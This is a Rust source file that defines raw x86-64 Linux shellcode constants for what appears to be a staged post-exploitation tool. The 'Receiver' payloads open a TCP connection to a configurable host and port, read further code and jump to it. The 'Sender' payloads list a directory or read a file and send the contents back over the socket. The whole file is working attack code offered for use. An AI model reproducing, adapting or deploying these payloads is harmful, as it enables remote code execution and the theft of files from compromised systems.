use crate::config::Receiver;
use crate::config::Sender;

pub const SYS_READ_RECEIVER: Receiver = Receiver {
    shellcode: &[
        0xeb, 0x0d, 0x31, 0xc0, 0x53, 0x5f, 0x48, 0x8d, 0x75, 0x0d, 0x6a, 0x7f,
        0x5a, 0x0f, 0x05, 0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01,
        0x5e, 0x0f, 0x05, 0x50, 0x5b, 0x48, 0x97, 0x68, 0x00, 0x00, 0x00, 0x00,
        0x66, 0x68, 0x11, 0x5c, 0x66, 0x6a, 0x02, 0x54, 0x5e, 0xb2, 0x10, 0xb0,
        0x2a, 0x0f, 0x05, 0x48, 0x8d, 0x2d, 0xc8, 0xff, 0xff, 0xff, 0xff, 0xe5,
    ],
    shellcode_len: 60,
    host_index: 32,
    port_index: 38,
};

pub const SYS_RECVFROM_RECEIVER: Receiver = Receiver {
    shellcode: &[
        0xeb, 0x17, 0x6a, 0x2d, 0x58, 0x53, 0x5f, 0x48, 0x8d, 0x75, 0x17, 0x6a,
        0x7f, 0x5a, 0x4d, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x0f,
        0x05, 0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f,
        0x05, 0x50, 0x5b, 0x48, 0x97, 0x68, 0x00, 0x00, 0x00, 0x00, 0x66, 0x68,
        0x00, 0x00, 0x66, 0x6a, 0x02, 0x54, 0x5e, 0xb2, 0x10, 0xb0, 0x2a, 0x0f,
        0x05, 0x48, 0x8d, 0x2d, 0xbe, 0xff, 0xff, 0xff, 0xff, 0xe5,
    ],
    shellcode_len: 70,
    host_index: 42,
    port_index: 48,
};

pub const SYS_OPEN_DIR_SENDER: Sender = Sender {
    shellcode: &[
        0x48, 0x8d, 0x3d, 0x3f, 0x00, 0x00, 0x00, 0x31, 0xf6, 0x31, 0xd2, 0x6a,
        0x02, 0x58, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x22, 0x48, 0x97, 0x66,
        0xba, 0xff, 0xff, 0x48, 0x29, 0xd4, 0x54, 0x5e, 0x6a, 0x4e, 0x58, 0x0f,
        0x05, 0x50, 0x48, 0x92, 0x48, 0x83, 0xc2, 0x08, 0x53, 0x5f, 0x54, 0x5e,
        0x6a, 0x01, 0x58, 0x0f, 0x05, 0xeb, 0x0d, 0x50, 0x53, 0x5f, 0x54, 0x5e,
        0x6a, 0x08, 0x5a, 0x6a, 0x01, 0x58, 0x0f, 0x05, 0xff, 0xe5
    ],
    shellcode_len: 70
};

pub const SYS_OPEN_CAT_SENDER: Sender = Sender {
    shellcode: &[
        0x48, 0x8d, 0x3d, 0x4f, 0x00, 0x00, 0x00, 0x31, 0xf6, 0x31, 0xd2, 0x6a,
        0x02, 0x58, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x32, 0x49, 0x90, 0x41,
        0xb9, 0x00, 0x08, 0x00, 0x00, 0x4c, 0x29, 0xcc, 0x41, 0x50, 0x5f, 0x54,
        0x5e, 0x41, 0x51, 0x5a, 0x31, 0xc0, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78,
        0x16, 0x74, 0x11, 0x50, 0x48, 0x92, 0x83, 0xc2, 0x08, 0x53, 0x5f, 0x54,
        0x5e, 0x6a, 0x01, 0x58, 0x0f, 0x05, 0xeb, 0xdc, 0x4c, 0x01, 0xcc, 0x50,
        0x53, 0x5f, 0x54, 0x5e, 0x6a, 0x08, 0x5a, 0x6a, 0x01, 0x58, 0x0f, 0x05,
        0xff, 0xe5,
    ],
    shellcode_len: 86
};